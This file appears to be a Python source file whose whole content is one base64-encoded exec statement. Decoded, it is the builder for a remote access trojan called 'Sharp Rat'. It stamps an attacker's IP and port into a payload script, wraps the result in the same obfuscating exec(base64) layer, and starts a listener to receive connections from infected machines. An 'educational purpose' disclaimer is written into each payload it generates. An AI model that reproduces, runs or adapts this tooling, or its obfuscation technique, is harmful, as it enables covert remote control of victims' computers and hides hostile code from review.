exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IGFyZ3BhcnNlICwgcHlmaWdsZXQgYXMgcGYgLCB0aW1lCmltcG9ydCBvcwpwYXJzZSAgPSBhcmdwYXJzZS5Bcmd1bWVudFBhcnNlcih1c2FnZT0iJShwcm9nKXMgWy0tYnVpbGRdIFstLXNoZWxsXSBbLWkgPElQPiAtcCA8UE9SVD4gLW8gPEZpbGUgbmFtZT5dIikKcGFyc2UuYWRkX2FyZ3VtZW50KCItaSIsIi0taXAiLG1ldGF2YXI9IjxpcD4iLGhlbHA9IklQIGFkZHJlc3MiKQpwYXJzZS5hZGRfYXJndW1lbnQoIi1wIiwiLS1wb3J0IiAsbWV0YXZhcj0iPHBvcnQ+IixoZWxwPSJwb3J0IikKcGFyc2UuYWRkX2FyZ3VtZW50KCItbyIsIi0tb3V0cHV0IiAsbWV0YXZhcj0iPEZpbGUgbmFtZT4iLGhlbHA9Ik91dHB1dCBmaWxlIG5hbWUiKQpwYXJzZS5hZGRfYXJndW1lbnQoIi0tYnVpbGQiLGhlbHA9IkZvciBjcmVhdGluZyBhIHBheWxvYWQiLGFjdGlvbj0nc3RvcmVfdHJ1ZScpCnBhcnNlLmFkZF9hcmd1bWVudCgiLS1zaGVsbCIsaGVscD0iRm9yIG1ha2luZyBsaXN0ZW5lciIgLCBhY3Rpb249J3N0b3JlX3RydWUnKQphcmdzID0gcGFyc2UucGFyc2VfYXJncygpCgpkZWYgZW5jb2RlKGRhdGEpOgogICAgZW5jb2RlZCA9IChfX2ltcG9ydF9fKCdiYXNlNjQnKS5iNjRlbmNvZGUoX19pbXBvcnRfXygnY29kZWNzJykuZ2V0ZW5jb2RlcigidXRmLTgiKShkYXRhKVswXSkpCiAgICBvazE9KGYiJ3tlbmNvZGVkLmRlY29kZSgpfSciKQogICAgb2sgPSBmImV4ZWMoX19pbXBvcnRfXygnYmFzZTY0JykuYjY0ZGVjb2RlKF9faW1wb3J0X18oJ2NvZGVjcycpLmdldGVuY29kZXIoJ3V0Zi04Jykoe29rMX0pWzBdKSkiCiAgICByZXR1cm4gb2sKCmRlZiBkZWNvZGUoZGF0YSk6CiAgICBpZiBkYXRhWzBdID09ICJiIjoKICAgICAgICBkYXRhID0gZGF0YVsxOl0KICAgIGRlY29kZWQgPSAoX19pbXBvcnRfXygnYmFzZTY0JykuYjY0ZGVjb2RlKF9faW1wb3J0X18oJ2NvZGVjcycpLmdldGVuY29kZXIoInV0Zi04IikoZGF0YSlbMF0pLmRlY29kZSgpKQogICAgIyBwcmludCh0eXBlKGRlY29kZWQpKSA9ID4gc3RyCiAgICByZXR1cm4gZGVjb2RlZAoKZGVmIGZpbGVfY2hlY2soKToKICAgIGlmIG5vdCAob3MucGF0aC5pc2RpcigiT1VUUFVUIikpOgogICAgICAgIG9zLm1rZGlyKCJPVVRQVVQiKQogICAgaWYgbm90IChvcy5wYXRoLmlzZGlyKCJkYXRhIikpOgogICAgICAgIHByaW50KCJbLV0gUmVxdWlyZSBGT0xERVIgaXMgbm90IGZvdW5kICIpCiAgICAgICAgb3MuX2V4aXQoMSkKICAgIGVsaWYgbm90IChvcy5wYXRoLmlzZmlsZSgiZGF0YS9wYXlsb2FkLnB5IikpOgogICAgICAgIHByaW50KCJbLV0gUmVxdWlyZSBQYXlsb2FkIGlzIG5vdCBmb3VuZCAiKQogICAgICAgIG9zLl9leGl0KDEpCiAgICBlbGlmIG5vdCAob3MucGF0aC5pc2ZpbGUoImRhdGEvTGlzdGVuZXIucHkiKSk6CiAgICAgICAgcHJpbnQoIlstXSBSZXF1aXJlIExpc3RlbmVyIGlzIG5vdCBmb3VuZCAiKQogICAgICAgIG9zLl9leGl0KDEpCgpkZWYgZ2VuX3BheShpcCAsIHBvcnQgLCBvdXQpOgogICAgdHJ5OgogICAgICAgIHdpdGggb3BlbigiZGF0YS9wYXlsb2FkLnB5IiAsICJyIikgYXMgZjE6CiAgICAgICAgICAgIFNhbXBsZSA9IGYxLnJlYWQoKQogICAgICAgICAgICBkZWNvZGVfcGF5bG9hZCA9IGRlY29kZShTYW1wbGUpCiAgICAgICAgIyAjIEdlbmVyYXRlIGEgcGF5bG9hZAogICAgICAgIHdvcmRzID0gWyI8SVA+IiwgIjxQT1JUPiJdCiAgICAgICAgZm9yIGkgaW4gd29yZHM6IAogICAgICAgICAgICBpZiBpID09ICI8SVA+IjoKICAgICAgICAgICAgICAgIHcgPSBpcAogICAgICAgICAgICBlbGlmIGkgPT0gIjxQT1JUPiI6CiAgICAgICAgICAgICAgICB3ID0gcG9ydAogICAgICAgICAgICBtYWluMSA9IGRlY29kZV9wYXlsb2FkLnJlcGxhY2UoaSwgdykKICAgICAgICAgICAgZGVjb2RlX3BheWxvYWQgPSBtYWluMQogICAgICAgICMgcHJpbnQoZGVjb2RlX3BheWxvYWQpICMgdG8gdmFyaWZ5IC4uCiAgICAgICAgRW5jb2RlZF9wYXlsb2FkID0gZW5jb2RlKGRlY29kZV9wYXlsb2FkKQogICAgICAgIHdpdGggb3BlbihmIk9VVFBVVC97b3V0fSIsICJ3IikgYXMgZjoKICAgICAgICAgICAgZi53cml0ZSgnIyBUSGlzIENvZGUgSXMgV3JpdHRlbiBCeSBfX0hBUUlPTE9HSVNUX19URUFNX19cbiMgVGhpcyBUb29sIElzIE9ubHkgRm9yIEVkdWNhdGlvbmFsIFB1cnBvc2UgXG4jIFNvLHRoaXMgdG9vbCBpcyBlbmNvZGVkXG4nKQogICAgICAgICAgICBmLndyaXRlKEVuY29kZWRfcGF5bG9hZCkKCiAgICAgICAgbGMgPSBvcy5nZXRjd2QoKSsiXFxPVVRQVVRcXCIrb3V0ICAgICAgICAgICAgIAogICAgICAgIHByaW50KCJbK10gU2F2ZWQgYXM6ICIrIG91dCkKICAgICAgICBwcmludChmIlsrXSBQYXlsb2FkIHNpemU6IHtvcy5wYXRoLmdldHNpemUobGMpfSBieXRlcy4iKQogICAgICAgIHByaW50KCJbK10gTG9jYXRpb246ICIrIGxjKQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIlsgRVJST1IgXSB7ZX0iKQoKZGVmIG1haW4oYXJncyk6CiAgICBpZiBhcmdzLmlwIGFuZCBhcmdzLnBvcnQ6CiAgICAgICAgaWYgYXJncy5idWlsZDoKICAgICAgICAgICAgcHJpbnQoIHBmLmZpZ2xldF9mb3JtYXQoIlNoYXJwIFJhdCIsZm9udD0ic2xhbnQiKSkKICAgICAgICAgICAgcG9ydCA9IChhcmdzLnBvcnQpCiAgICAgICAgICAgIGlwID0gYXJncy5pcAogICAgICAgICAgICBvdXQgPSBhcmdzLm91dHB1dAogICAgICAgICAgICBpZiAob3V0Wy0zOl0gIT0gIi5weSIpIDoKICAgICAgICAgICAgICAgIG91dCArPSAiLnB5IgogICAgICAgICAgICAjIyBERVRBSUwgJycnCiAgICAgICAgICAgICcnJwogICAgICAgICAgICBwcmludChmIlsrXSBZb3VyIHNlbGVjdGVkIHBvcnQgaXMgOiB7YXJncy5wb3J0fSIpCiAgICAgICAgICAgIHByaW50KGYiWytdIFlvdXIgc2VsZWN0ZWQgcG9ydCBpcyA6IHthcmdzLmlwfSIpCiAgICAgICAgICAgICcnJwogICAgICAgICAgICAKICAgICAgICAgICAgZ2VuX3BheShpcCAsIHBvcnQgLCBvdXQpCiAgICAgICAgZWxpZihhcmdzLnNoZWxsKToKICAgICAgICAgICAgb3Muc3lzdGVtKGYiY2QgZGF0YSAmIHB5dGhvbiBMaXN0ZW5lci5weSB7YXJncy5pcH0ge2ludChhcmdzLnBvcnQpfSAiKQoKZmlsZV9jaGVjaygpCm1haW4oYXJncyk=')[0]))
